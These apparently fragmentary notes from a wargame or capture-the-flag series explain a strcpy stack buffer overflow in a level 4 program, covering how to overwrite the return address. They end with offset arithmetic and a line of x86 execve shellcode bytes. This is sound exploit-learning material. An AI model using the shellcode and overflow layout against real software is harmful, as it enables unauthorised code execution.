## Level 1: avoid the "system" call

## Level 4: 

The source code on this level is surprisingly simple:
```
void fun(char *str) {
  char buf[1024];
  strcpy(buf, str);
}

int main(int argc, char **argv) {
  // ... 
  fun(argv[1]);
  // ... 
}
```

The problem is quite obvious:
`strcpy` is well-known to be unsafe,
as it does not check if the destination array has enough space to store the source array.
With a sufficiently long command line argument we can overwrite the memory area beyond `buf` in the `fun` function.

If you recall from the previous challenge,
the return address from a function is stored on the stack after local variables.
That means that by overwriting `buf`,
we can overwrite the return address.
Which in turn means that we can make the program jump to somewhere else,
perhaps to a memory area that we can overwrite,
such as the content of `buf`.

Why is it that the right location is 1024 + 12 ?
buf + sfp + ret + p1

1036 + ADDR
S(45) + 991 + ADDR
S=$(printf '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/df')
